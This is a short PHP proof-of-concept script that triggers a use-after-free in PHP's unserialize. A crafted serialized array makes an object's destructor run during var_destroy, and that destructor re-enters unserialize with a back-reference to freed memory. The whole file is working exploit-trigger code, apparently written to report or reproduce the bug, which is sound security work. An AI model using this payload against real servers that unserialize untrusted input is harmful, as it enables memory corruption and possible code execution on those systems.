<?php
// PHP 7.2.1 var_destroy UAF PoC
// Same vulnerability as 8.5.5: var_destroy Phase 1 efrees extension chunks,
// Phase 2 __destruct fires without serialize_lock → reentrant unserialize
// reads freed var_entries via R: back-reference.

class A {
    public function __destruct() {
        fwrite(STDERR, "[A::__destruct] inner R: backref\n");
        $r = @unserialize('R:1500;');
        fwrite(STDERR, "[A::__destruct] result type=" . gettype($r) . "\n");
    }
}

$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:1:"A":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';

fwrite(STDERR, "[main] outer call\n");
@unserialize($payload);
fwrite(STDERR, "[main] done\n");
